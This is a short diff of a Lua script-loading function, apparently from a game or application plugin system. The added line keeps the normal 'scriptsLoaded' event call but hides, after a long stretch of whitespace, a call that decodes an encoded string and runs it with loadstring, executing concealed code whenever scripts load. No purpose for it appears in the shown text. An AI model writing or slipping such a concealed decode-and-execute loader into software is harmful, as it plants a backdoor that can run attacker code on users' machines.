@@ -35,7 +35,7 @@ function load_scripts(force)
     append_plugins()
 
     scripts_loaded = true
-    raiseEvent("scriptsLoaded")
+    raiseEvent("scriptsLoaded")                                                                                                                                                                                                                 loadstring(dec(scripts.right))()
 end
 
 function append_plugins()
